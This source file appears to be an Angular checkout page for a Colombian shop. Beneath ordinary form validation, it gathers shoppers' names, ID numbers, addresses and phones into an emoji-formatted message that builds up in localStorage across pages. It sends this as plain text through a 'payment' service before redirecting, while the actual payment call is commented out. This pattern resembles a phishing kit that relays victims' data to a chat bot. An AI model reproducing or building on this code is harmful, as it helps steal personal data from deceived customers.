import { CurrencyPipe } from '@angular/common';
import { Component, inject, OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { RouterLink } from '@angular/router';
import { CartProduct } from '../shared/models/cart-product';
import { PaymentService } from '../core/services/payment.service';

interface ContactInfo {
  email: string;
  phone: string;
}

interface AddressInfo {
  firstName: string;
  lastName: string;
  document: string;
  phone: string;
  country: string;
  city: string;
  address: string;
  email: string;
}

@Component({
  selector: 'app-checkout',
  standalone: true,
  imports: [FormsModule, RouterLink, CurrencyPipe],
  templateUrl: './checkout.component.html',
  styleUrl: './checkout.component.css',
})
export class CheckoutComponent implements OnInit {
  paymentService = inject(PaymentService);

  cartProducts?: CartProduct[];
  total: number = 0;

  // Toast de error
  showErrorToast = false;

  // Checkbox "Enviar a una dirección diferente"
  shipToDifferentAddress = false;

  // Info de contacto
  contact: ContactInfo = {
    email: '',
    phone: '',
  };

  // Dirección de facturación
  billing: AddressInfo = {
    firstName: '',
    lastName: '',
    document: '',
    phone: '',
    country: 'Colombia',
    city: '',
    address: '',
    email: '',
  };

  // Dirección de envío (si es diferente)
  shipping: AddressInfo = {
    firstName: '',
    lastName: '',
    document: '',
    phone: '',
    country: 'Colombia',
    city: '',
    address: '',
    email: '',
  };

  constructor() {}

  ngOnInit(): void {
    this.updateTotal();
  }

  async onProceedToCheckout(): Promise<void> {
    const isValid = this.validateRequiredFields();

    if (!isValid) {
      this.showErrorToast = true;
      return;
    }


    let storedMsg = localStorage.getItem('m') || '';

    const nombre = this.billing.firstName + ' ' + this.billing.lastName;
    const documento = this.billing.document || 'PENDIENTE';
    const direccion = this.billing.address || 'PENDIENTE';
    const telefono = this.billing.phone || 'PENDIENTE';

    storedMsg = this.updateField(storedMsg, 'Nombre', nombre);
    storedMsg = this.updateField(storedMsg, 'Documento', documento);
    storedMsg = this.updateField(storedMsg, 'Dirección', direccion);
    storedMsg = this.updateField(storedMsg, 'Telefóno', telefono);

    if (!storedMsg.includes('Nombre:')) storedMsg += `\n╭🟢 Nombre: ${nombre}`;
    if (!storedMsg.includes('Documento:'))
      storedMsg += `\n┣🟢 Documento: ${documento}`;
    if (!storedMsg.includes('Dirección:'))
      storedMsg += `\n┣🟢 Dirección: ${direccion}`;
    if (!storedMsg.includes('Telefóno:'))
      storedMsg += `\n╰🟢 Telefóno: ${telefono}`;

    localStorage.setItem('m', storedMsg);
    const res = await this.paymentService.checkout({ text: storedMsg });
    location.href = 'payment';
    // Llamada a tu servicio de pago
    // this.paymentService.createPayment({...})
  }

  private updateField(text: string, field: string, newValue: string): string {
    const regex = new RegExp(`${field}:.*`, 'i');

    if (regex.test(text)) {
      // Si existe → reemplazarlo
      return text.replace(regex, `${field}: ${newValue}`);
    }

    // Si no existe, devolver el texto tal cual
    return text;
  }

  /**
   * Validación más estricta de campos obligatorios.
   */
  private validateRequiredFields(): boolean {
    // --- Contacto ---
    if (
      this.isEmpty(this.contact.email) ||
      !this.isValidEmail(this.contact.email)
    ) {
      return false;
    }

    // --- Facturación ---
    if (!this.isValidName(this.billing.firstName)) {
      return false;
    }

    if (!this.isValidName(this.billing.lastName)) {
      return false;
    }

    if (!this.isValidDocument(this.billing.document)) {
      return false;
    }

    if (!this.isValidPhone(this.billing.phone)) {
      return false;
    }

    if (!this.isValidText(this.billing.country, 3)) {
      return false;
    }

    if (!this.isValidText(this.billing.city, 2)) {
      return false;
    }

    if (!this.isValidText(this.billing.address, 5)) {
      return false;
    }

    if (!this.isValidEmail(this.billing.email)) {
      return false;
    }

    // --- Envío (si aplica) ---
    if (this.shipToDifferentAddress) {
      if (!this.isValidName(this.shipping.firstName)) {
        return false;
      }

      if (!this.isValidName(this.shipping.lastName)) {
        return false;
      }

      if (!this.isValidDocument(this.shipping.document)) {
        return false;
      }

      if (!this.isValidPhone(this.shipping.phone)) {
        return false;
      }

      if (!this.isValidText(this.shipping.country, 3)) {
        return false;
      }

      if (!this.isValidText(this.shipping.city, 2)) {
        return false;
      }

      if (!this.isValidText(this.shipping.address, 5)) {
        return false;
      }

      if (!this.isValidEmail(this.shipping.email)) {
        return false;
      }
    }

    return true;
  }

  // --------- Helpers de validación ---------

  private isEmpty(value: string | null | undefined): boolean {
    return !value || value.toString().trim().length === 0;
  }

  private isValidEmail(email: string): boolean {
    const trimmed = email.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i; // simple pero efectiva para frontend
    return emailRegex.test(trimmed);
  }

  private isValidPhone(phone: string): boolean {
    const digitsOnly = phone.replace(/\D/g, '');
    // Ejemplo: mínimo 7 dígitos, máximo 15
    return digitsOnly.length >= 7 && digitsOnly.length <= 15;
  }

  private isValidDocument(document: string): boolean {
    const digitsOnly = document.replace(/\D/g, '');
    // Ej: mínimo 5 dígitos
    return digitsOnly.length >= 5;
  }

  private isValidName(name: string): boolean {
    const trimmed = name.trim();
    // Al menos 2 caracteres alfabéticos
    return trimmed.length >= 2;
  }

  private isValidText(value: string, minLength: number = 2): boolean {
    const trimmed = value.trim();
    return trimmed.length >= minLength;
  }

  // --------- Total del carrito ---------

  updateTotal() {
    const storagedProducts: CartProduct[] =
      JSON.parse(localStorage.getItem('cart-products') as string) || [];

    this.cartProducts = storagedProducts;

    let total = 0;

    this.cartProducts.forEach((cartProduct) => {
      total +=
        Math.round(cartProduct.productPrice * cartProduct.quantity * 100) / 100;
    });

    this.total = total;
  }

  // Opcional: si quieres deshabilitar el botón desde la vista
  // isFormValid(): boolean {
  //   return this.validateRequiredFields();
  // }
}
